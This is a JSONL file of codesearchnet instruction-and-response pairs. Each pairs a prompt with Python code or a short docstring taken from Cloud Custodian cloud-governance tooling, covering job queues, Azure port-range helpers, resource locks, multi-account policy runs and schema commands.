{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nshows contents of a queue.", "response": "def inspect_queue(queue, state, limit, bucket):\n    \"\"\"Show contents of a queue.\"\"\"\n    if not HAVE_BIN_LIBS:\n        click.echo(\"missing required binary libs (lz4, msgpack)\")\n        return\n\n    conn = worker.connection\n\n    def job_row(j):\n        if isinstance(j.args[0], basestring):\n            account, bucket = j.args[0].split(':', 1)\n        elif isinstance(j.args[0], dict):\n            account, bucket = j.args[0]['name'], \"set %d\" % len(j.args[1])\n\n        row = {\n            'account': account,\n            'bucket': bucket,\n            # 'region': j.args[1]['region'],\n            # 'size': j.args[1]['keycount'],\n            'ttl': j.ttl,\n            'enqueued': j.enqueued_at,\n            'rtt': j.result_ttl,\n            'timeout': j.timeout}\n\n        if queue != \"bucket-keyset-scan\":\n            row['args'] = j.args[2:]\n        if state in ('running', 'failed', 'finished'):\n            row['started'] = j.started_at\n        if state in ('finished', 'failed'):\n            row['ended'] = j.ended_at\n        return row\n\n    if state == 'running':\n        registry_class = StartedJobRegistry\n    elif state == 'pending':\n        registry_class = Queue\n    elif state == 'failed':\n        registry_class = FailedQueue\n    elif state == 'finished':\n        registry_class = FinishedJobRegistry\n    else:\n        raise ValueError(\"invalid state: %s\" % state)\n\n    registry = registry_class(queue, connection=conn)\n    records = []\n    for jid in registry.get_job_ids():\n        j = Job.fetch(jid, conn)\n        if bucket:\n            if j.args[1]['name'] != bucket:\n                continue\n        records.append(job_row(j))\n        if len(records) == limit:\n            break\n    if records:\n        click.echo(\n            tabulate.tabulate(\n                records,\n                \"keys\",\n                tablefmt='simple'))\n    else:\n        click.echo(\"no queue items found\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreports on progress by queues.", "response": "def queues():\n    \"\"\"Report on progress by queues.\"\"\"\n    conn = worker.connection\n    failure_q = None\n\n    def _repr(q):\n        return \"running:%d pending:%d finished:%d\" % (\n            StartedJobRegistry(q.name, conn).count,\n            q.count,\n            FinishedJobRegistry(q.name, conn).count)\n    for q in Queue.all(conn):\n        if q.name == 'failed':\n            failure_q = q\n            continue\n        click.echo(\"%s %s\" % (q.name, _repr(q)))\n    if failure_q:\n        click.echo(\n            click.style(failure_q.name, fg='red') + ' %s' % _repr(failure_q))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nshows any unexpected failures", "response": "def failures():\n    \"\"\"Show any unexpected failures\"\"\"\n    if not HAVE_BIN_LIBS:\n        click.echo(\"missing required binary libs (lz4, msgpack)\")\n        return\n\n    q = Queue('failed', connection=worker.connection)\n    for i in q.get_job_ids():\n        j = q.job_class.fetch(i, connection=q.connection)\n        click.echo(\"%s on %s\" % (j.func_name, j.origin))\n        if not j.func_name.endswith('process_keyset'):\n            click.echo(\"params %s %s\" % (j._args, j._kwargs))\n        click.echo(j.exc_info)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating a c7n - org subscriptions config file", "response": "def main(output):\n    \"\"\"\n    Generate a c7n-org subscriptions config file\n    \"\"\"\n\n    client = SubscriptionClient(Session().get_credentials())\n    subs = [sub.serialize(True) for sub in client.subscriptions.list()]\n    results = []\n    for sub in subs:\n        sub_info = {\n            'subscription_id': sub['subscriptionId'],\n            'name': sub['displayName']\n        }\n        results.append(sub_info)\n\n    print(\n        yaml.safe_dump(\n            {'subscriptions': results},\n            default_flow_style=False),\n        file=output)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef custodian_azure_send_override(self, request, headers=None, content=None, **kwargs):\n    retries = 0\n    max_retries = 3\n    while retries < max_retries:\n        response = self.orig_send(request, headers, content, **kwargs)\n\n        send_logger.debug(response.status_code)\n        for k, v in response.headers.items():\n            if k.startswith('x-ms-ratelimit'):\n                send_logger.debug(k + ':' + v)\n\n        # Retry codes from urllib3/util/retry.py\n        if response.status_code in [413, 429, 503]:\n            retry_after = None\n            for k in response.headers.keys():\n                if StringUtils.equal('retry-after', k):\n                    retry_after = int(response.headers[k])\n\n            if retry_after is not None and retry_after < constants.DEFAULT_MAX_RETRY_AFTER:\n                send_logger.warning('Received retriable error code %i. Retry-After: %i'\n                                    % (response.status_code, retry_after))\n                time.sleep(retry_after)\n                retries += 1\n            else:\n                send_logger.error(\"Received throttling error, retry time is %i\"\n                                  \"(retry only if < %i seconds).\"\n                                  % (retry_after, constants.DEFAULT_MAX_RETRY_AFTER))\n                break\n        else:\n            break\n    return response", "response": "Override send function to implement retries & log headers\n   "}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_principal_dictionary(graph_client, object_ids, raise_on_graph_call_error=False):\n        if not object_ids:\n            return {}\n\n        object_params = GetObjectsParameters(\n            include_directory_object_references=True,\n            object_ids=object_ids)\n\n        principal_dics = {object_id: DirectoryObject() for object_id in object_ids}\n\n        aad_objects = graph_client.objects.get_objects_by_object_ids(object_params)\n        try:\n            for aad_object in aad_objects:\n                principal_dics[aad_object.object_id] = aad_object\n\n        except CloudError as e:\n            if e.status_code in [403, 401]:\n                GraphHelper.log.warning(\n                    'Credentials not authorized for access to read from Microsoft Graph. \\n '\n                    'Can not query on principalName, displayName, or aadType. \\n')\n            else:\n                GraphHelper.log.error(\n                    'Exception in call to Microsoft Graph. \\n '\n                    'Can not query on principalName, displayName, or aadType. \\n'\n                    'Error: {0}'.format(e))\n\n            if raise_on_graph_call_error:\n                raise\n\n        return principal_dics", "response": "Retrieves the principal dictionary for the given object ids."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nattempts to resolve a principal name.", "response": "def get_principal_name(graph_object):\n        \"\"\"Attempts to resolve a principal name.\n        :param graph_object: the Azure AD Graph Object\n        :return: The resolved value or an empty string if unsuccessful.\n        \"\"\"\n        if hasattr(graph_object, 'user_principal_name'):\n            return graph_object.user_principal_name\n        elif hasattr(graph_object, 'service_principal_names'):\n            return graph_object.service_principal_names[0]\n        elif hasattr(graph_object, 'display_name'):\n            return graph_object.display_name\n        return ''"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a tuple with start and end ports", "response": "def _get_port_range(range_str):\n        \"\"\" Given a string with a port or port range: '80', '80-120'\n            Returns tuple with range start and end ports: (80, 80), (80, 120)\n        \"\"\"\n        if range_str == '*':\n            return PortsRangeHelper.PortsRange(start=0, end=65535)\n\n        s = range_str.split('-')\n        if len(s) == 2:\n            return PortsRangeHelper.PortsRange(start=int(s[0]), end=int(s[1]))\n\n        return PortsRangeHelper.PortsRange(start=int(s[0]), end=int(s[0]))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_rule_port_ranges(rule):\n        properties = rule['properties']\n        if 'destinationPortRange' in properties:\n            return [PortsRangeHelper._get_port_range(properties['destinationPortRange'])]\n        else:\n            return [PortsRangeHelper._get_port_range(r)\n                    for r in properties['destinationPortRanges']]", "response": "Extracts the ports ranges from the NSG rule object\n            Returns an array of PortsRange tuples"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _port_ranges_to_set(ranges):\n        return set([i for r in ranges for i in range(r.start, r.end + 1)])", "response": "Converts an array of port ranges to a set of integers\n           "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nvalidating that the string has proper port numbers", "response": "def validate_ports_string(ports):\n        \"\"\" Validate that provided string has proper port numbers:\n            1. port number < 65535\n            2. range start < range end\n        \"\"\"\n        pattern = re.compile('^\\\\d+(-\\\\d+)?(,\\\\d+(-\\\\d+)?)*$')\n        if pattern.match(ports) is None:\n            return False\n\n        ranges = PortsRangeHelper._get_string_port_ranges(ports)\n        for r in ranges:\n            if r.start > r.end or r.start > 65535 or r.end > 65535:\n                return False\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ntransforms a list of port numbers to the list of strings with port ranges Example : 10 12 - 13 14 - 15", "response": "def get_ports_strings_from_list(data):\n        \"\"\" Transform a list of port numbers to the list of strings with port ranges\n            Example: [10, 12, 13, 14, 15] -> ['10', '12-15']\n        \"\"\"\n        if len(data) == 0:\n            return []\n\n        # Transform diff_ports list to the ranges list\n        first = 0\n        result = []\n        for it in range(1, len(data)):\n            if data[first] == data[it] - (it - first):\n                continue\n            result.append(PortsRangeHelper.PortsRange(start=data[first], end=data[it - 1]))\n            first = it\n\n        # Update tuples with strings, representing ranges\n        result.append(PortsRangeHelper.PortsRange(start=data[first], end=data[-1]))\n        result = [str(x.start) if x.start == x.end else \"%i-%i\" % (x.start, x.end) for x in result]\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef build_ports_dict(nsg, direction_key, ip_protocol):\n        rules = nsg['properties']['securityRules']\n        rules = sorted(rules, key=lambda k: k['properties']['priority'])\n        ports = {}\n\n        for rule in rules:\n            # Skip rules with different direction\n            if not StringUtils.equal(direction_key, rule['properties']['direction']):\n                continue\n\n            # Check the protocol: possible values are 'TCP', 'UDP', '*' (both)\n            # Skip only if rule and ip_protocol are 'TCP'/'UDP' pair.\n            protocol = rule['properties']['protocol']\n            if not StringUtils.equal(protocol, \"*\") and \\\n               not StringUtils.equal(ip_protocol, \"*\") and \\\n               not StringUtils.equal(protocol, ip_protocol):\n                continue\n\n            IsAllowed = StringUtils.equal(rule['properties']['access'], 'allow')\n            ports_set = PortsRangeHelper.get_ports_set_from_rule(rule)\n\n            for p in ports_set:\n                if p not in ports:\n                    ports[p] = IsAllowed\n\n        return ports", "response": "Builds a dictionary of ports based on the provided Network Security Group object direction and protocol."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_name(self, r):\n        namer = ResourceNameAdapters[self.manager.resource_type.service]\n        return namer(r)", "response": "Given an arbitrary resource attempt to resolve back to a qualified name."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update_headers(src_tree):\n    print(\"src tree\", src_tree)\n    for root, dirs, files in os.walk(src_tree):\n        py_files = fnmatch.filter(files, \"*.py\")\n        for f in py_files:\n            print(\"checking\", f)\n            p = os.path.join(root, f)\n            with open(p) as fh:\n                contents = fh.read()\n            if suffix in contents:\n                continue\n            print(\"Adding license header to %s\" % p)\n            with open(p, 'w') as fh:\n                fh.write(\n                    '%s%s%s' % (header, suffix, contents))", "response": "Update the license headers for all the modules in src_tree."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nshows extant locks and unlocks.", "response": "def list_locks(account_id, resource_type=None, resource_id=None):\n    \"\"\"Show extant locks and unlocks.\n    \"\"\"\n    locks = Client(BASE_URL, account_id).list_locks().json()\n\n    for r in locks:\n        if 'LockDate' in r:\n            r['LockDate'] = datetime.fromtimestamp(r['LockDate'])\n        if 'RevisionDate' in r:\n            r['RevisionDate'] = datetime.fromtimestamp(r['RevisionDate'])\n\n    print(tabulate.tabulate(\n        locks,\n        headers=\"keys\",\n        tablefmt='fancy_grid'))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nshowing extant locks status", "response": "def lock_status(account_id, resource_id, parent_id):\n    \"\"\"Show extant locks' status\n    \"\"\"\n    return output(\n        Client(BASE_URL, account_id).lock_status(resource_id, parent_id))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nlocking a resource in a given account", "response": "def lock(account_id, resource_id, region):\n    \"\"\"Lock a resource\n    \"\"\"\n    return output(\n        Client(BASE_URL, account_id).lock(resource_id, region))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list_locks(self, account_id=None):\n        account_id = self.get_account_id(account_id)\n        return self.http.get(\n            \"%s/%s/locks\" % (self.endpoint, account_id),\n            auth=self.get_api_auth())", "response": "Get extant locks for the given account."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget the lock status for a given resource.", "response": "def lock_status(self, resource_id, parent_id=None, account_id=None):\n        \"\"\"Get the lock status for a given resource.\n\n        for security groups, parent id is their vpc.\n        \"\"\"\n        account_id = self.get_account_id(account_id)\n        params = parent_id and {'parent_id': parent_id} or None\n        return self.http.get(\n            \"%s/%s/locks/%s\" % (self.endpoint, account_id, resource_id),\n            params=params, auth=self.get_api_auth())"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nlocking a given resource in a given region.", "response": "def lock(self, resource_id, region, account_id=None):\n        \"\"\"Lock a given resource\n        \"\"\"\n        account_id = self.get_account_id(account_id)\n        return self.http.post(\n            \"%s/%s/locks/%s/lock\" % (self.endpoint, account_id, resource_id),\n            json={'region': region},\n            auth=self.get_api_auth())"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreporting on a cross account policy execution.", "response": "def report(config, output, use, output_dir, accounts,\n           field, no_default_fields, tags, region, debug, verbose,\n           policy, policy_tags, format, resource, cache_path):\n    \"\"\"report on a cross account policy execution.\"\"\"\n    accounts_config, custodian_config, executor = init(\n        config, use, debug, verbose, accounts, tags, policy,\n        resource=resource, policy_tags=policy_tags)\n\n    resource_types = set()\n    for p in custodian_config.get('policies'):\n        resource_types.add(p['resource'])\n    if len(resource_types) > 1:\n        raise ValueError(\"can only report on one resource type at a time\")\n    elif not len(custodian_config['policies']) > 0:\n        raise ValueError(\"no matching policies found\")\n\n    records = []\n    with executor(max_workers=WORKER_COUNT) as w:\n        futures = {}\n        for a in accounts_config.get('accounts', ()):\n            for r in resolve_regions(region or a.get('regions', ())):\n                futures[w.submit(\n                    report_account,\n                    a, r,\n                    custodian_config,\n                    output_dir,\n                    cache_path,\n                    debug)] = (a, r)\n\n        for f in as_completed(futures):\n            a, r = futures[f]\n            if f.exception():\n                if debug:\n                    raise\n                log.warning(\n                    \"Error running policy in %s @ %s exception: %s\",\n                    a['name'], r, f.exception())\n            records.extend(f.result())\n\n    log.debug(\n        \"Found %d records across %d accounts and %d policies\",\n        len(records), len(accounts_config['accounts']),\n        len(custodian_config['policies']))\n\n    if format == 'json':\n        dumps(records, output, indent=2)\n        return\n\n    prefix_fields = OrderedDict(\n        (('Account', 'account'), ('Region', 'region'), ('Policy', 'policy')))\n    config = Config.empty()\n    factory = resource_registry.get(list(resource_types)[0])\n\n    formatter = Formatter(\n        factory.resource_type,\n        extra_fields=field,\n        include_default_fields=not(no_default_fields),\n        include_region=False,\n        include_policy=False,\n        fields=prefix_fields)\n\n    rows = formatter.to_csv(records, unique=False)\n    writer = UnicodeWriter(output, formatter.headers())\n    writer.writerow(formatter.headers())\n    writer.writerows(rows)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nruns an aws script across accounts", "response": "def run_script(config, output_dir, accounts, tags, region, echo, serial, script_args):\n    \"\"\"run an aws script across accounts\"\"\"\n    # TODO count up on success / error / error list by account\n    accounts_config, custodian_config, executor = init(\n        config, None, serial, True, accounts, tags, (), ())\n\n    if echo:\n        print(\"command to run: `%s`\" % (\" \".join(script_args)))\n        return\n\n    # Support fully quoted scripts, which are common to avoid parameter\n    # overlap with c7n-org run-script.\n    if len(script_args) == 1 and \" \" in script_args[0]:\n        script_args = script_args[0].split()\n\n    with executor(max_workers=WORKER_COUNT) as w:\n        futures = {}\n        for a in accounts_config.get('accounts', ()):\n            for r in resolve_regions(region or a.get('regions', ())):\n                futures[\n                    w.submit(run_account_script, a, r, output_dir,\n                             serial, script_args)] = (a, r)\n        for f in as_completed(futures):\n            a, r = futures[f]\n            if f.exception():\n                if serial:\n                    raise\n                log.warning(\n                    \"Error running script in %s @ %s exception: %s\",\n                    a['name'], r, f.exception())\n            exit_code = f.result()\n            if exit_code == 0:\n                log.info(\n                    \"ran script on account:%s region:%s script: `%s`\",\n                    a['name'], r, \" \".join(script_args))\n            else:\n                log.info(\n                    \"error running script on account:%s region:%s script: `%s`\",\n                    a['name'], r, \" \".join(script_args))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef run_account(account, region, policies_config, output_path,\n                cache_period, cache_path, metrics, dryrun, debug):\n    \"\"\"Execute a set of policies on an account.\n    \"\"\"\n    logging.getLogger('custodian.output').setLevel(logging.ERROR + 1)\n    CONN_CACHE.session = None\n    CONN_CACHE.time = None\n\n    # allow users to specify interpolated output paths\n    if '{' not in output_path:\n        output_path = os.path.join(output_path, account['name'], region)\n\n    cache_path = os.path.join(cache_path, \"%s-%s.cache\" % (account['account_id'], region))\n\n    config = Config.empty(\n        region=region, cache=cache_path,\n        cache_period=cache_period, dryrun=dryrun, output_dir=output_path,\n        account_id=account['account_id'], metrics_enabled=metrics,\n        log_group=None, profile=None, external_id=None)\n\n    env_vars = account_tags(account)\n\n    if account.get('role'):\n        if isinstance(account['role'], six.string_types):\n            config['assume_role'] = account['role']\n            config['external_id'] = account.get('external_id')\n        else:\n            env_vars.update(\n                _get_env_creds(get_session(account, 'custodian', region), region))\n\n    elif account.get('profile'):\n        config['profile'] = account['profile']\n\n    policies = PolicyCollection.from_data(policies_config, config)\n    policy_counts = {}\n    success = True\n    st = time.time()\n\n    with environ(**env_vars):\n        for p in policies:\n            # Variable expansion and non schema validation (not optional)\n            p.expand_variables(p.get_variables(account.get('vars', {})))\n            p.validate()\n\n            log.debug(\n                \"Running policy:%s account:%s region:%s\",\n                p.name, account['name'], region)\n            try:\n                resources = p.run()\n                policy_counts[p.name] = resources and len(resources) or 0\n                if not resources:\n                    continue\n                log.info(\n                    \"Ran account:%s region:%s policy:%s matched:%d time:%0.2f\",\n                    account['name'], region, p.name, len(resources),\n                    time.time() - st)\n            except ClientError as e:\n                success = False\n                if e.response['Error']['Code'] == 'AccessDenied':\n                    log.warning('Access denied account:%s region:%s',\n                                account['name'], region)\n                    return policy_counts, success\n                log.error(\n                    \"Exception running policy:%s account:%s region:%s error:%s\",\n                    p.name, account['name'], region, e)\n                continue\n            except Exception as e:\n                success = False\n                log.error(\n                    \"Exception running policy:%s account:%s region:%s error:%s\",\n                    p.name, account['name'], region, e)\n                if not debug:\n                    continue\n                import traceback, pdb, sys\n                traceback.print_exc()\n                pdb.post_mortem(sys.exc_info()[-1])\n                raise\n\n    return policy_counts, success", "response": "Execute a set of policies on an account."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef run(config, use, output_dir, accounts, tags, region,\n        policy, policy_tags, cache_period, cache_path, metrics,\n        dryrun, debug, verbose, metrics_uri):\n    \"\"\"run a custodian policy across accounts\"\"\"\n    accounts_config, custodian_config, executor = init(\n        config, use, debug, verbose, accounts, tags, policy, policy_tags=policy_tags)\n    policy_counts = Counter()\n    success = True\n\n    if metrics_uri:\n        metrics = metrics_uri\n\n    if not cache_path:\n        cache_path = os.path.expanduser(\"~/.cache/c7n-org\")\n        if not os.path.exists(cache_path):\n            os.makedirs(cache_path)\n\n    with executor(max_workers=WORKER_COUNT) as w:\n        futures = {}\n        for a in accounts_config['accounts']:\n            for r in resolve_regions(region or a.get('regions', ())):\n                futures[w.submit(\n                    run_account,\n                    a, r,\n                    custodian_config,\n                    output_dir,\n                    cache_period,\n                    cache_path,\n                    metrics,\n                    dryrun,\n                    debug)] = (a, r)\n\n        for f in as_completed(futures):\n            a, r = futures[f]\n            if f.exception():\n                if debug:\n                    raise\n                log.warning(\n                    \"Error running policy in %s @ %s exception: %s\",\n                    a['name'], r, f.exception())\n\n            account_region_pcounts, account_region_success = f.result()\n            for p in account_region_pcounts:\n                policy_counts[p] += account_region_pcounts[p]\n\n            if not account_region_success:\n                success = False\n\n    log.info(\"Policy resource counts %s\" % policy_counts)\n\n    if not success:\n        sys.exit(1)", "response": "run a custodian policy across accounts"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef emit(self, message):\n        # We're sending messages asynchronously, bubble to caller when\n        # we've detected an error on the message. This isn't great,\n        # but options once we've gone async without a deferred/promise\n        # aren't great.\n        if self.transport and self.transport.error:\n            raise self.transport.error\n\n        # Sanity safety, people do like to recurse by attaching to\n        # root log :-(\n        if message.name.startswith('boto'):\n            return\n\n        msg = self.format_message(message)\n        if not self.transport:\n            self.start_transports()\n        self.buf.append(msg)\n        self.flush_buffers(\n            (message.created - self.last_seen >= self.batch_interval))\n\n        self.last_seen = message.created", "response": "Send a message to the log."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nensure all logging output has been flushed.", "response": "def flush(self):\n        \"\"\"Ensure all logging output has been flushed.\"\"\"\n        if self.shutdown:\n            return\n        self.flush_buffers(force=True)\n        self.queue.put(FLUSH_MARKER)\n        self.queue.join()"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nhandle various client side errors when describing images", "response": "def extract_bad_ami(e):\n        \"\"\"Handle various client side errors when describing images\"\"\"\n        msg = e.response['Error']['Message']\n        error = e.response['Error']['Code']\n        e_ami_ids = None\n        if error == 'InvalidAMIID.NotFound':\n            e_ami_ids = [\n                e_ami_id.strip() for e_ami_id\n                in msg[msg.find(\"'[\") + 2:msg.rfind(\"]'\")].split(',')]\n            log.warning(\"Image not found %s\" % e_ami_ids)\n        elif error == 'InvalidAMIID.Malformed':\n            e_ami_ids = [msg[msg.find('\"') + 1:msg.rfind('\"')]]\n            log.warning(\"Image id malformed %s\" % e_ami_ids)\n        return e_ami_ids"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nformat config for lambda exec", "response": "def format_json(config):\n    \"\"\"format config for lambda exec\n    \"\"\"\n    with open(config) as fh:\n        print(json.dumps(yaml.safe_load(fh.read()), indent=2))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef metrics(function, api, start, period):\n    from c7n.mu import LambdaManager\n    manager = LambdaManager(boto3.Session)\n    start = parse_date(start)\n    period = int(abs(parse_timedelta(period).total_seconds()))\n\n    print(\"Lambda Metrics\")\n    metrics = manager.metrics(\n        [{'FunctionName': function}],\n        start=start, end=datetime.utcnow(),\n        period=period)\n    for k in ('Invocations', 'Throttles', 'Errors'):\n        values = [n['Sum'] for n in metrics[0][k]]\n        render_metrics(k, values)\n\n    if not api:\n        return\n\n    print(\"Api Metrics\")\n    metrics = gateway_metrics(\n        boto3.Session, api, \"latest\", start, datetime.utcnow(), period)\n    for k, data in metrics.items():\n        if \"Count\" in k:\n            values = [n['Sum'] for n in data]\n        else:\n            values = [n['Average'] for n in data]\n        render_metrics(k, values)\n\n    print(\"Db Metrics\")\n    metrics = db_metrics(\n        boto3.Session, \"Sphere11.Dev.ResourceLocks\",\n        start, datetime.utcnow(), period)\n    for k, data in metrics.items():\n        values = [n['Average'] for n in data]\n        render_metrics(k, values)", "response": "Get metrics for a given function in a given API."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef flush_pending(function):\n    s = boto3.Session()\n    client = s.client('lambda')\n    results = client.invoke(\n        FunctionName=function,\n        Payload=json.dumps({'detail-type': 'Scheduled Event'})\n    )\n    content = results.pop('Payload').read()\n    pprint.pprint(results)\n    pprint.pprint(json.loads(content))", "response": "Attempt to acquire any pending locks.\n   "}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef config_status():\n    s = boto3.Session()\n    client = s.client('config')\n    channels = client.describe_delivery_channel_status()[\n        'DeliveryChannelsStatus']\n    for c in channels:\n        print(yaml.safe_dump({\n            c['name']: dict(\n                snapshot=str(\n                    c['configSnapshotDeliveryInfo'].get('lastSuccessfulTime')),\n                history=str(\n                    c['configHistoryDeliveryInfo'].get('lastSuccessfulTime')),\n                stream=str(\n                    c['configStreamDeliveryInfo'].get('lastStatusChangeTime'))\n            ),\n        }, default_flow_style=False))", "response": "Check config status in an account."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef local(reload, port):\n    import logging\n    from bottle import run\n    from app import controller, app\n    from c7n.resources import load_resources\n    load_resources()\n    print(\"Loaded resources definitions\")\n    logging.basicConfig(level=logging.DEBUG)\n    logging.getLogger('botocore').setLevel(logging.WARNING)\n    if controller.db.provision():\n        print(\"Table Created\")\n    run(app, reloader=reload, port=port)", "response": "run local app server"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _schema_get_docstring(starting_class):\n    for cls in inspect.getmro(starting_class):\n        if inspect.getdoc(cls):\n            return inspect.getdoc(cls)", "response": "Given a class return its docstring."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a list of possible options for the given prefix.", "response": "def schema_completer(prefix):\n    \"\"\" For tab-completion via argcomplete, return completion options.\n\n    For the given prefix so far, return the possible options.  Note that\n    filtering via startswith happens after this list is returned.\n    \"\"\"\n    from c7n import schema\n    load_resources()\n    components = prefix.split('.')\n\n    if components[0] in provider.clouds.keys():\n        cloud_provider = components.pop(0)\n        provider_resources = provider.resources(cloud_provider)\n    else:\n        cloud_provider = 'aws'\n        provider_resources = provider.resources('aws')\n        components[0] = \"aws.%s\" % components[0]\n\n    # Completions for resource\n    if len(components) == 1:\n        choices = [r for r in provider.resources().keys()\n                   if r.startswith(components[0])]\n        if len(choices) == 1:\n            choices += ['{}{}'.format(choices[0], '.')]\n        return choices\n\n    if components[0] not in provider_resources.keys():\n        return []\n\n    # Completions for category\n    if len(components) == 2:\n        choices = ['{}.{}'.format(components[0], x)\n                   for x in ('actions', 'filters') if x.startswith(components[1])]\n        if len(choices) == 1:\n            choices += ['{}{}'.format(choices[0], '.')]\n        return choices\n\n    # Completions for item\n    elif len(components) == 3:\n        resource_mapping = schema.resource_vocabulary(cloud_provider)\n        return ['{}.{}.{}'.format(components[0], components[1], x)\n                for x in resource_mapping[components[0]][components[1]]]\n\n    return []"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef schema_cmd(options):\n    from c7n import schema\n    if options.json:\n        schema.json_dump(options.resource)\n        return\n\n    load_resources()\n\n    resource_mapping = schema.resource_vocabulary()\n    if options.summary:\n        schema.summary(resource_mapping)\n        return\n\n    # Here are the formats for what we accept:\n    # - No argument\n    #   - List all available RESOURCES\n    # - PROVIDER\n    #   - List all available RESOURCES for supplied PROVIDER\n    # - RESOURCE\n    #   - List all available actions and filters for supplied RESOURCE\n    # - MODE\n    #   - List all available MODES\n    # - RESOURCE.actions\n    #   - List all available actions for supplied RESOURCE\n    # - RESOURCE.actions.ACTION\n    #   - Show class doc string and schema for supplied action\n    # - RESOURCE.filters\n    #   - List all available filters for supplied RESOURCE\n    # - RESOURCE.filters.FILTER\n    #   - Show class doc string and schema for supplied filter\n\n    if not options.resource:\n        resource_list = {'resources': sorted(provider.resources().keys())}\n        print(yaml.safe_dump(resource_list, default_flow_style=False))\n        return\n\n    # Format is [PROVIDER].RESOURCE.CATEGORY.ITEM\n    # optional provider defaults to aws for compatibility\n    components = options.resource.lower().split('.')\n    if len(components) == 1 and components[0] in provider.clouds.keys():\n        resource_list = {'resources': sorted(\n            provider.resources(cloud_provider=components[0]).keys())}\n        print(yaml.safe_dump(resource_list, default_flow_style=False))\n        return\n    if components[0] in provider.clouds.keys():\n        cloud_provider = components.pop(0)\n        resource_mapping = schema.resource_vocabulary(\n            cloud_provider)\n        components[0] = '%s.%s' % (cloud_provider, components[0])\n    elif components[0] in schema.resource_vocabulary().keys():\n        resource_mapping = schema.resource_vocabulary()\n    else:\n        resource_mapping = schema.resource_vocabulary('aws')\n        components[0] = 'aws.%s' % components[0]\n\n    #\n    # Handle mode\n    #\n    if components[0] == \"mode\":\n        if len(components) == 1:\n            output = {components[0]: list(resource_mapping[components[0]].keys())}\n            print(yaml.safe_dump(output, default_flow_style=False))\n            return\n\n        if len(components) == 2:\n            if components[1] not in resource_mapping[components[0]]:\n                log.error('{} is not a valid mode'.format(components[1]))\n                sys.exit(1)\n\n            _print_cls_schema(resource_mapping[components[0]][components[1]])\n            return\n\n        # We received too much (e.g. mode.actions.foo)\n        log.error(\"Invalid selector '{}'. Valid options are 'mode' \"\n                  \"or 'mode.TYPE'\".format(options.resource))\n        sys.exit(1)\n    #\n    # Handle resource\n    #\n    resource = components[0]\n    if resource not in resource_mapping:\n        log.error('{} is not a valid resource'.format(resource))\n        sys.exit(1)\n\n    if len(components) == 1:\n        docstring = _schema_get_docstring(\n            resource_mapping[resource]['classes']['resource'])\n        del(resource_mapping[resource]['classes'])\n        if docstring:\n            print(\"\\nHelp\\n----\\n\")\n            print(docstring + '\\n')\n        output = {resource: resource_mapping[resource]}\n        print(yaml.safe_dump(output))\n        return\n\n    #\n    # Handle category\n    #\n    category = components[1]\n    if category not in ('actions', 'filters'):\n        log.error(\"Valid choices are 'actions' and 'filters'. You supplied '{}'\".format(category))\n        sys.exit(1)\n\n    if len(components) == 2:\n        output = \"No {} available for resource {}.\".format(category, resource)\n        if category in resource_mapping[resource]:\n            output = {resource: {\n                category: resource_mapping[resource][category]}}\n        print(yaml.safe_dump(output))\n        return\n\n    #\n    # Handle item\n    #\n    item = components[2]\n    if item not in resource_mapping[resource][category]:\n        log.error('{} is not in the {} list for resource {}'.format(item, category, resource))\n        sys.exit(1)\n\n    if len(components) == 3:\n        cls = resource_mapping[resource]['classes'][category][item]\n        _print_cls_schema(cls)\n\n        return\n\n    # We received too much (e.g. s3.actions.foo.bar)\n    log.error(\"Invalid selector '{}'.  Max of 3 components in the \"\n              \"format RESOURCE.CATEGORY.ITEM\".format(options.resource))\n    sys.exit(1)", "response": "Print info about the resources actions and filters available."}
